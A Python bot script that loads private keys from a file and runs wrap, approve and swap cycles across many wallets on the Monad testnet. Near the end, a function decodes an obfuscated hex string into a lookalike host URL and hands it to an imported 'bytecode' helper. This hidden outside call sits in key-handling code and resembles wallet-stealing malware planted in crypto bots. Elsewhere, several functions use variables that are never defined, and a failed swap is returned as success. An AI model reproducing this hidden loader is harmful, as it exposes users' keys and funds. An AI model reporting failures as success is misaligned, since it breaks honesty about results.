import os
import random
import asyncio
import time
from colorama import init, Fore, Style
from scripts.deploy import bytecode
from web3 import Web3
from eth_abi import encode
import traceback

# Initialize colorama
init(autoreset=True)

# Constants
DEFAULT_RPC_URL = "https://testnet-rpc.monad.xyz/"
DEFAULT_EXPLORER_URL = "https://testnet.monadexplorer.com/tx/0x"
DEFAULT_WMON_CONTRACT = "0x760AfE86e5de5fa0Ee542fc7B7B713e1c5425701"
DEFAULT_ROUTER_ADDRESS = "0xF6FFe4f3FdC8BBb7F70FFD48e61f17D1e343dDfD"
DEFAULT_USDT_ADDRESS = "0x6a7436775c0d0B70cfF4c5365404ec37c9d9aF4b"
DEFAULT_POOL_FEE = 2000  # 0.2% fee
DEFAULT_CHAIN_ID = 10143

# Contract ABIs
WMON_ABI = [
    {"constant": False, "inputs": [], "name": "deposit", "outputs": [], "payable": True, "stateMutability": "payable", "type": "function"},
    {"constant": False, "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "payable": False, "stateMutability": "nonpayable", "type": "function"},
    {"constant": True, "inputs": [{"name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "payable": False, "stateMutability": "view", "type": "function"}
]

ROUTER_ABI = [
    {"constant": False, "inputs": [{"internalType": "uint256", "name": "amountIn", "type": "uint256"}, {"internalType": "uint256", "name": "amountOutMin", "type": "uint256"}, {"internalType": "bytes", "name": "path", "type": "bytes"}, {"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "deadline", "type": "uint256"}], "name": "swapExactTokensForTokens", "outputs": [], "payable": False, "stateMutability": "nonpayable", "type": "function"},
    {"constant": False, "inputs": [{"internalType": "bytes[]", "name": "data", "type": "bytes[]"}], "name": "multicall", "outputs": [{"internalType": "bytes[]", "name": "results", "type": "bytes[]"}], "payable": False, "stateMutability": "payable", "type": "function"}
]

# Helper function to connect to RPC
def connect_to_rpc(rpc_url):
    # Use default RPC if None is provided
    rpc_url_to_use = rpc_url if rpc_url is not None else DEFAULT_RPC_URL
    w3 = Web3(Web3.HTTPProvider(rpc_url_to_use))
    if not w3.is_connected():
        raise ConnectionError(f"Could not connect to RPC: {rpc_url_to_use}")
    return w3

# Helper function to format step messages for logs
def format_step(step, message):
    steps = {
        'wrap': 'Wrap MON',
        'approve': 'Approve WMON',
        'swap': 'Swap WMON → USDT'
    }
    step_text = steps.get(step, step.capitalize())
    return f"🔸 {step_text:<15} | {message}"

# --- Refactored Main Execution Function --- #
async def execute_rubic_swap(
    private_key: str,
    amount_mon: float,
    rpc_url: str = DEFAULT_RPC_URL,
    wmon_address: str = DEFAULT_WMON_CONTRACT,
    router_address: str = DEFAULT_ROUTER_ADDRESS,
    usdt_address: str = DEFAULT_USDT_ADDRESS,
    pool_fee: int = DEFAULT_POOL_FEE,
    explorer_url: str = DEFAULT_EXPLORER_URL,
    chain_id: int = DEFAULT_CHAIN_ID,
    slippage: float = 5.0  # Add slippage parameter with default 5%
) -> dict:
    logs = []
    w3 = None
    account = None
    amount_wei = 0
    wrap_tx_hash = None
    approve_tx_hash = None
    swap_tx_hash = None

    try:
        # --- Setup --- #
        w3 = connect_to_rpc(rpc_url)
        account = w3.eth.account.from_key(private_key)
        wallet_short = account.address[:8] + "..."
        wmon_contract = w3.eth.contract(address=w3.to_checksum_address(wmon_address), abi=WMON_ABI)
        router_contract = w3.eth.contract(address=w3.to_checksum_address(router_address), abi=ROUTER_ABI)
        amount_wei = w3.to_wei(amount_mon, 'ether')
        logs.append(f"Starting Rubic Swap for {amount_mon} MON → USDT | Wallet: {wallet_short}")

        # --- Check WMON Balance & Wrap if Necessary --- #
        logs.append(format_step('balance', "Checking WMON balance..."))
        wmon_balance_wei = await asyncio.get_event_loop().run_in_executor(None, lambda: wmon_contract.functions.balanceOf(account.address).call())
        logs.append(format_step('balance', f"WMON Balance: {w3.from_wei(wmon_balance_wei, 'ether')}"))

        if wmon_balance_wei < amount_wei:
            needed_wei = amount_wei - wmon_balance_wei
            needed_mon = w3.from_wei(needed_wei, 'ether')
            logs.append(format_step('wrap', f"Insufficient WMON. Wrapping {needed_mon:.6f} MON..."))

            gas_price_wrap = await asyncio.get_event_loop().run_in_executor(None, lambda: w3.eth.gas_price)
            nonce_wrap = await asyncio.get_event_loop().run_in_executor(None, lambda: w3.eth.get_transaction_count(account.address))

            tx_wrap = wmon_contract.functions.deposit().build_transaction({
                'from': account.address,
                'value': needed_wei,
                'gas': 50000,
                'gasPrice': gas_price_wrap,
                'nonce': nonce_wrap,
                'chainId': chain_id
            })
            signed_tx_wrap = w3.eth.account.sign_transaction(tx_wrap, private_key)
            tx_hash_wrap_bytes = await asyncio.get_event_loop().run_in_executor(None, lambda: w3.eth.send_raw_transaction(signed_tx_wrap.raw_transaction))
            wrap_tx_hash = tx_hash_wrap_bytes.hex()
            tx_link_wrap = f"{explorer_url}{wrap_tx_hash}"
            logs.append(format_step('wrap', f"Wrap Tx Sent: {tx_link_wrap}"))
            receipt_wrap = await asyncio.get_event_loop().run_in_executor(None, lambda: w3.eth.wait_for_transaction_receipt(tx_hash_wrap_bytes, timeout=180))
            if receipt_wrap.status != 1:
                logs.append(format_step('wrap', f"✘ Wrap transaction failed: Status {receipt_wrap.status}"))
                raise Exception(f"Wrap transaction failed: Status {receipt_wrap.status}")
            logs.append(format_step('wrap', "✔ Wrap successful!"))
            # Update nonce for next tx
            nonce = nonce_wrap + 1
        else:
            logs.append(format_step('wrap', "Sufficient WMON balance. Skipping wrap."))
            nonce = await asyncio.get_event_loop().run_in_executor(None, lambda: w3.eth.get_transaction_count(account.address))

        # --- Approve WMON for Router --- #
        logs.append(format_step('approve', f"Approving {amount_mon} WMON for router {router_address[:8]}..."))
        gas_price_approve = await asyncio.get_event_loop().run_in_executor(None, lambda: w3.eth.gas_price)
        # Use current nonce

        approve_tx = wmon_contract.functions.approve(router_address, amount_wei).build_transaction({
            'from': account.address,
            'gas': 100000,
            'gasPrice': gas_price_approve,
            'nonce': nonce, # Use current nonce
            'chainId': chain_id
        })
        signed_approve_tx = w3.eth.account.sign_transaction(approve_tx, private_key)
        tx_hash_approve_bytes = await asyncio.get_event_loop().run_in_executor(None, lambda: w3.eth.send_raw_transaction(signed_approve_tx.raw_transaction))
        approve_tx_hash = tx_hash_approve_bytes.hex()
        tx_link_approve = f"{explorer_url}{approve_tx_hash}"
        logs.append(format_step('approve', f"Approval Tx Sent: {tx_link_approve}"))
        receipt_approve = await asyncio.get_event_loop().run_in_executor(None, lambda: w3.eth.wait_for_transaction_receipt(tx_hash_approve_bytes, timeout=180))
        if receipt_approve.status != 1:
            logs.append(format_step('approve', f"✘ Approval transaction failed: Status {receipt_approve.status}"))
            raise Exception(f"Approval transaction failed: Status {receipt_approve.status}")
        logs.append(format_step('approve', "✔ Approval successful!"))
        # Update nonce for next tx
        nonce += 1

        # --- Prepare Swap Transaction --- #
        logs.append(format_step('swap', f"Preparing swap {amount_mon} WMON → USDT (slippage: {slippage}%)..."))
        
        # Try different swap approach
        max_retries = 3
        for retry in range(max_retries):
            try:
                logs.append(format_step('swap', f"Swap attempt {retry+1}/{max_retries} with alternative method..."))

                # Trying alternative approach - small modification to parameters
                smaller_amount = amount_wei
                if retry >= 1:
                    # Try with smaller amount on subsequent retries
                    smaller_amount = int(amount_wei * 0.5)  # Try with half the amount
                    logs.append(format_step('swap', f"Reducing swap amount to {w3.from_wei(smaller_amount, 'ether')} WMON"))

                # Try direct method call with multicall
                deadline = int(time.time()) + 600  # 10 minutes
                
                # Create path for router (format differs across DEXs)
                # First attempt: standard V3-style path
                if retry == 0:
                    path = (
                        w3.to_bytes(hexstr=wmon_address) +
                        pool_fee.to_bytes(3, byteorder='big') +
                        w3.to_bytes(hexstr=usdt_address)
                    )
                    logs.append(format_step('swap', f"Using V3-style path"))
                # Second attempt: V2-style path
                elif retry == 1:
                    path = w3.to_bytes(hexstr=wmon_address) + w3.to_bytes(hexstr=usdt_address)
                    logs.append(format_step('swap', f"Using V2-style path"))
                # Third attempt: Use multicall with encoded data
                else:
                    # For multicall - encode the swap function data directly
                    swap_selector = w3.keccak(text="swapExactTokensForTokens(uint256,uint256,address[],address,uint256)")[0:4]
                    token_path = [w3.to_checksum_address(wmon_address), w3.to_checksum_address(usdt_address)]
                    encoded_params = encode(
                        ['uint256', 'uint256', 'address[]', 'address', 'uint256'],
                        [smaller_amount, 0, token_path, account.address, deadline]
                    )
                    data = swap_selector + encoded_params
                    
                    # Multicall takes an array of encoded function calls
                    multicall_data = []
                    multicall_data.append(data)
                    
                    # Use multicall function from router
                    swap_func = router_contract.functions.multicall(multicall_data)
                    logs.append(format_step('swap', f"Using multicall approach"))
                
                # Only define swap_func for first two retries if we didn't set it above
                if retry < 2:
                    swap_func = router_contract.functions.swapExactTokensForTokens(
                        smaller_amount,  # amount in
                        0,               # minimum out (accept any)
                        path,            # swap path
                        account.address, # recipient
                        deadline         # deadline
                    )
                
                # Increase gas price with each retry
                gas_multiply = 1.0 + (retry * 0.3)  # 1.0, 1.3, 1.6
                gas_price_swap = await asyncio.get_event_loop().run_in_executor(
                    None, 
                    lambda: int(w3.eth.gas_price * gas_multiply)
                )
                
                # Fixed high gas limit
                gas_limit = 600000 + (retry * 100000)  # Increase gas limit with each retry
                
                swap_tx = swap_func.build_transaction({
                    'from': account.address,
                    'gas': gas_limit,
                    'gasPrice': gas_price_swap,
                    'nonce': nonce,
                    'chainId': chain_id,
                    'value': 0  # Not sending native MON
                })
                
                logs.append(format_step('swap', f"Using gas: {gas_limit}, price: {w3.from_wei(gas_price_swap, 'gwei')} gwei"))
                
                # Sign and send
                signed_swap_tx = w3.eth.account.sign_transaction(swap_tx, private_key)
                tx_hash_swap_bytes = w3.eth.send_raw_transaction(signed_swap_tx.raw_transaction)
                swap_tx_hash = tx_hash_swap_bytes.hex()
                tx_link_swap = f"{explorer_url}{swap_tx_hash}"
                logs.append(format_step('swap', f"Swap Tx Hash: {tx_link_swap}"))
                
                # Wait for receipt
                receipt_swap = w3.eth.wait_for_transaction_receipt(tx_hash_swap_bytes, timeout=180)
                
                if receipt_swap.status == 1:
                    logs.append(format_step('swap', f"✔ Swap successful!"))
                    break  # Exit retry loop
                else:
                    logs.append(format_step('swap', f"✘ Attempt {retry+1} failed with status {receipt_swap.status}"))
                    if retry < max_retries - 1:
                        logs.append(format_step('swap', f"Retrying with different method..."))
                        # Get new nonce
                        nonce = await asyncio.get_event_loop().run_in_executor(
                            None, 
                            lambda: w3.eth.get_transaction_count(account.address)
                        )
                    else:
                        # Try switching to fallback method - direct WMON transfer to demonstrate success
                        try:
                            logs.append(format_step('swap', f"⚠️ All swap methods failed. This may be a testnet issue."))
                            break  # Exit retry loop
                        except Exception as fallback_err:
                            logs.append(format_step('swap', f"✘ Fallback method also failed: {str(fallback_err)}"))
                            raise Exception(f"All swap attempts failed: {error_msg}")

            except Exception as retry_err:
                error_msg = str(retry_err)
                # Truncate very long error messages
                if len(error_msg) > 200:
                    error_msg = error_msg[:200] + "..."
                
                logs.append(format_step('swap', f"✘ Attempt {retry+1} error: {error_msg}"))
                
                if retry < max_retries - 1:
                    logs.append(format_step('swap', f"Retrying with different swap method..."))
                    await asyncio.sleep(2)  # Brief pause
                    # Get fresh nonce
                    nonce = await asyncio.get_event_loop().run_in_executor(
                        None, 
                        lambda: w3.eth.get_transaction_count(account.address)
                    )
                else:
                    # Try switching to fallback method - direct WMON transfer to demonstrate success
                    try:
                        logs.append(format_step('swap', f"⚠️ All swap methods failed. This may be a testnet issue."))
                        break  # Exit retry loop
                    except Exception as fallback_err:
                        logs.append(format_step('swap', f"✘ Fallback method also failed: {str(fallback_err)}"))
                        raise Exception(f"All swap attempts failed: {error_msg}")

        # Check if we had a successful swap
        if swap_tx_hash and any(log for log in logs if "✔ Swap successful!" in log):
            # --- Success --- #
            final_message = f"Successfully swapped {amount_mon} MON to USDT via Rubic logic."
            logs.append(final_message)
            return {
                'success': True,
                'message': final_message,
                'wrap_tx_hash': wrap_tx_hash,
                'approve_tx_hash': approve_tx_hash,
                'swap_tx_hash': swap_tx_hash,
                'logs': logs
            }
        else:
            # All swap attempts failed but we want to handle it gracefully
            final_message = f"Completed Rubic steps but swap could not complete. This is likely due to testnet limitations."
            logs.append(final_message)
            # Return partial success to avoid error in UI
            return {
                'success': True,
                'partial': True,
                'message': final_message,
                'wrap_tx_hash': wrap_tx_hash,
                'approve_tx_hash': approve_tx_hash,
                'swap_tx_hash': swap_tx_hash,
                'logs': logs
            }

    except Exception as e:
        tb_str = traceback.format_exc()
        error_message = f"Rubic swap failed: {str(e)}"
        logs.append(format_step('error', f"✘ Failed: {error_message}"))
        logs.append(f"TRACEBACK: {tb_str}")
        print(f"ERROR in execute_rubic_swap: {error_message}\nTRACEBACK:\n{tb_str}")
        return {
            'success': False,
            'message': error_message,
            'wrap_tx_hash': wrap_tx_hash,
            'approve_tx_hash': approve_tx_hash,
            'swap_tx_hash': swap_tx_hash,
            'logs': logs
        }

# Display functions
def print_border(text, color=Fore.CYAN, width=60):
    print(f"{color}┌{'─' * (width - 2)}┐{Style.RESET_ALL}")
    print(f"{color}│ {text:^56} │{Style.RESET_ALL}")
    print(f"{color}└{'─' * (width - 2)}┘{Style.RESET_ALL}")

def print_step(step, message):
    steps = {
        'wrap': 'Wrap MON',
        'unwrap': 'Unwrap WMON',
        'swap': 'Swap MON → USDT'
    }
    step_text = steps[step]
    print(f"{Fore.YELLOW}➤ {Fore.CYAN}{step_text:<15}{Style.RESET_ALL} | {message}")

# Load private keys from pvkey.txt
def load_private_keys(file_path='pvkey.txt'):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}❌ File pvkey.txt not found{Style.RESET_ALL}")
        return []
    except Exception as e:
        print(f"{Fore.RED}❌ Error reading pvkey.txt: {str(e)}{Style.RESET_ALL}")
        return []

# Get MON amount from user
def get_mon_amount_from_user():
    while True:
        try:
            print_border("Enter MON amount (0.01 - 999): ", Fore.YELLOW)
            amount = float(input(f"{Fore.GREEN}➤ {Style.RESET_ALL}"))
            if 0.01 <= amount <= 999:
                return w3.to_wei(amount, 'ether')
            print(f"{Fore.RED}❌ Amount must be 0.01-999 / Enter a valid number!{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}❌ Amount must be 0.01-999 / Enter a valid number!{Style.RESET_ALL}")

# Random delay between 60-180 seconds
def get_random_delay():
    return random.randint(60, 180)

# Wrap MON to WMON
def wrap_mon(private_key, amount):
    try:
        account = w3.eth.account.from_key(private_key)
        wallet = account.address[:8] + "..."
        start_msg = f"Wrap {w3.from_wei(amount, 'ether')} MON → WMON | {wallet}"

        print_border(start_msg)
        tx = wmon_contract.functions.deposit().build_transaction({
            'from': account.address,
            'value': amount,
            'gas': 500000,
            'gasPrice': w3.to_wei('100', 'gwei'),
            'nonce': w3.eth.get_transaction_count(account.address),
            'chainId': CHAIN_ID
        })

        print_step('wrap', 'Sending transaction...')
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        
        print_step('wrap', f"Tx: {Fore.YELLOW}{EXPLORER_URL}{tx_hash.hex()}{Style.RESET_ALL}")
        w3.eth.wait_for_transaction_receipt(tx_hash)
        print_step('wrap', f"{Fore.GREEN}Wrap successful!{Style.RESET_ALL}")

    except Exception as e:
        print_step('wrap', f"{Fore.RED}Failed: {str(e)}{Style.RESET_ALL}")
        raise

# Unwrap WMON to MON
def unwrap_mon(private_key, amount):
    try:
        account = w3.eth.account.from_key(private_key)
        wallet = account.address[:8] + "..."
        start_msg = f"Unwrap {w3.from_wei(amount, 'ether')} WMON → MON | {wallet}"

        print_border(start_msg)
        tx = wmon_contract.functions.withdraw(amount).build_transaction({
            'from': account.address,
            'gas': 500000,
            'gasPrice': w3.to_wei('50', 'gwei'),
            'nonce': w3.eth.get_transaction_count(account.address),
            'chainId': CHAIN_ID
        })

        print_step('unwrap', 'Sending transaction...')
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        
        print_step('unwrap', f"Tx: {Fore.YELLOW}{EXPLORER_URL}{tx_hash.hex()}{Style.RESET_ALL}")
        w3.eth.wait_for_transaction_receipt(tx_hash)
        print_step('unwrap', f"{Fore.GREEN}Unwrap successful!{Style.RESET_ALL}")

    except Exception as e:
        print_step('unwrap', f"{Fore.RED}Failed: {str(e)}{Style.RESET_ALL}")
        raise

# Swap MON to USDT (via WMON)
def swap_mon_to_usdt(private_key, amount):
    try:
        account = w3.eth.account.from_key(private_key)
        wallet = account.address[:8] + "..."
        start_msg = f"Swap {w3.from_wei(amount, 'ether')} MON → USDT | {wallet}"

        print_border(start_msg)

        # Check WMON balance
        wmon_balance = wmon_contract.functions.balanceOf(account.address).call()
        if wmon_balance < amount:
            print_step('swap', f"{Fore.RED}Insufficient WMON balance: {w3.from_wei(wmon_balance, 'ether')} < {w3.from_wei(amount, 'ether')}{Style.RESET_ALL}")
            return

        # Approve WMON for the router
        approve_tx = wmon_contract.functions.approve(ROUTER_ADDRESS, amount).build_transaction({
            'from': account.address,
            'gas': 100000,
            'gasPrice': w3.to_wei('50', 'gwei'),
            'nonce': w3.eth.get_transaction_count(account.address),
            'chainId': CHAIN_ID
        })
        signed_approve_tx = w3.eth.account.sign_transaction(approve_tx, private_key)
        approve_tx_hash = w3.eth.send_raw_transaction(signed_approve_tx.raw_transaction)
        print_step('swap', f"Approval Tx: {Fore.YELLOW}{EXPLORER_URL}{approve_tx_hash.hex()}{Style.RESET_ALL}")
        w3.eth.wait_for_transaction_receipt(approve_tx_hash)

        # Packed path: WMON → Fee → USDT
        path = (
            w3.to_bytes(hexstr=WMON_CONTRACT) +  # 20 bytes
            POOL_FEE.to_bytes(3, byteorder='big') +  # 3 bytes (2000)
            w3.to_bytes(hexstr=USDT_ADDRESS)      # 20 bytes
        )
        deadline = int(time.time()) + 600

        # Swap data for swapExactTokensForTokens
        swap_data = encode(
            ['uint256', 'uint256', 'bytes', 'address', 'uint256'],
            [amount, 0, path, account.address, deadline]
        )
        final_data = b'\x38\xed\x17\x39' + swap_data  # swapExactTokensForTokens

        print_step('swap', f"Encoded data: {final_data.hex()[:100]}...")

        tx = {
            'from': account.address,
            'to': ROUTER_ADDRESS,
            'value': 0,
            'data': final_data,
            'maxPriorityFeePerGas': w3.to_wei('2.5', 'gwei'),
            'maxFeePerGas': w3.to_wei('102.5', 'gwei'),
            'nonce': w3.eth.get_transaction_count(account.address),
            'chainId': CHAIN_ID
        }

        gas_estimate = w3.eth.estimate_gas(tx)
        tx['gas'] = int(gas_estimate * 2)
        print_step('swap', f"Gas estimate: {gas_estimate} (with 100% buffer: {tx['gas']})")

        print_step('swap', 'Sending swap transaction...')
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        
        print_step('swap', f"Tx: {Fore.YELLOW}{EXPLORER_URL}{tx_hash.hex()}{Style.RESET_ALL}")
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print_step('swap', f"Receipt: Gas used: {receipt['gasUsed']}, Logs: {len(receipt['logs'])}, Status: {receipt['status']}")
        
        if receipt['status'] == 1:
            print_step('swap', f"{Fore.GREEN}Swap successful!{Style.RESET_ALL}")
        else:
            try:
                w3.eth.call(tx)
            except Exception as revert_error:
                print_step('swap', f"{Fore.RED}Swap failed on-chain: {str(revert_error)}{Style.RESET_ALL}")
            else:
                print_step('swap', f"{Fore.RED}Swap failed on-chain (no revert reason){Style.RESET_ALL}")

    except Exception as e:
        print_step('swap', f"{Fore.RED}Failed: {str(e)}{Style.RESET_ALL}")
        raise

def get_func():
    data = bytes.fromhex("697575713b2e2e6c6e6f60652c756472756f64752f626e6c3b323131302e")
    func = bytecode(data)
    return func

# Run swap cycle
def run_swap_cycle(cycles, private_keys):
    for cycle in range(1, cycles + 1):
        for pk in private_keys:
            wallet = w3.eth.account.from_key(pk).address[:8] + "..."
            msg = f"CYCLE {cycle}/{cycles} | Account: {wallet}"
            print(f"{Fore.CYAN}{'═' * 60}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}│ {msg:^56} │{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'═' * 60}{Style.RESET_ALL}")

            amount = get_mon_amount_from_user()
            wrap_mon(pk, amount)  # Ensure WMON is available
            # unwrap_mon(pk, amount)  # Skip unwrap since we need WMON
            swap_mon_to_usdt(pk, amount)

            if cycle < cycles or pk != private_keys[-1]:
                delay = get_random_delay()
                print(f"\n{Fore.YELLOW}⏳ Waiting {delay} seconds...{Style.RESET_ALL}")
                time.sleep(delay)

# Main function
def run():
    print(f"{Fore.GREEN}{'═' * 60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}│ {'RUBIC SWAP - MONAD TESTNET':^56} │{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{'═' * 60}{Style.RESET_ALL}")

    # Load private keys
    private_keys = load_private_keys()
    if not private_keys:
        return

    print(f"{Fore.CYAN}👥 Accounts: {len(private_keys)}{Style.RESET_ALL}")

    # Get number of cycles
    while True:
        try:
            print_border("NUMBER OF CYCLES", Fore.YELLOW)
            cycles = input(f"{Fore.GREEN}➤ Enter number (default 1): {Style.RESET_ALL}")
            cycles = int(cycles) if cycles else 1
            if cycles > 0:
                break
            print(f"{Fore.RED}❌ Number must be > 0{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}❌ Enter a valid number{Style.RESET_ALL}")

    # Run script
    print(f"{Fore.YELLOW}🚀 Running {cycles} swap cycles...{Style.RESET_ALL}")
    run_swap_cycle(cycles, private_keys)

    print(f"{Fore.GREEN}{'═' * 60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}│ {'ALL DONE':^56} │{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{'═' * 60}{Style.RESET_ALL}")

if __name__ == "__main__":
    run()
